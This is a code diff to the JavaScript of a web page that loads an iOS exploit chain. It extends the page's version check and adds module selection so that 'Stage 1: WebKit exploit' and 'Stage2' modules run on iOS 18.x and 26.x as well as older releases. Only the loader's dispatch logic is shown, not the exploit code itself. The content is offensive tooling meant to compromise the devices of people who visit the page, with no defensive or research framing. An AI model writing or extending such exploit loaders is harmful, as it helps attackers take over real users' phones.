@@ -332,14 +332,17 @@
                 var major = parseInt(match[1], 10);
                 var minor = parseInt(match[2], 10);
                 var patch = match[3] ? parseInt(match[3], 10) : 0;
-                // Higher than 17.2.1
-                if (major > 17 || (major === 17 && minor > 2) || (major === 17 && minor === 2 && patch > 1)) {
+                // Outside supported ranges: 13.0–17.2.1, 18.0–18.x, 26.0–26.x
+                var supported = (major >= 13 && (major < 17 || (major === 17 && minor < 2) || (major === 17 && minor === 2 && patch <= 1)))
+                    || (major === 18)
+                    || (major === 26);
+                if (!supported) {
                     document.getElementById('versionWarning').classList.add('show');
                 }
             } else if (!/iPhone|iPad|iPod/.test(ua)) {
                 // Not an iOS device at all - show warning
                 document.getElementById('versionWarning').classList.add('show');
-                document.getElementById('versionWarning').textContent = 'This tool is designed for iOS 13.0 \u2013 17.2.1 devices only. You can still view the page.';
+                document.getElementById('versionWarning').textContent = 'This tool is designed for iOS 13.0\u201317.2.1, 18.x, and 26.x devices only. You can still view the page.';
             }
         })();
 
@@ -529,7 +532,11 @@
                 "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
             ).platformState.versionFlags;
 
-            if (offsets.wF8NpI) {
+            if (offsets.Hm7RvN) {
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_26.0_26.x_ironroot");
+            } else if (offsets.Yt3FsK) {
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_18.0_18.x_thornvine");
+            } else if (offsets.wF8NpI) {
                 await (await globalThis.moduleManager.getModuleByURL("Stage2_16.6_17.2.1_seedbell_pre")).ul();
                 pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_17.0_17.2.1_seedbell");
             } else if (offsets.LJ1EuL) {
@@ -585,7 +592,11 @@
             setStatus("Stage 1: WebKit exploit...", "running");
             window.log("[LOADER] Selecting stage1 variant...");
 
-            if (offsets.JtEUci) {
+            if (offsets.Bv9KmR) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_26.0_26.x_chimera");
+            } else if (offsets.Xp4WqZ) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_18.0_18.x_manticore");
+            } else if (offsets.JtEUci) {
                 stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_16.6_17.2.1_cassowary");
             } else if (offsets.KeCRDQ) {
                 stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_16.2_16.5.1_terrorbird");
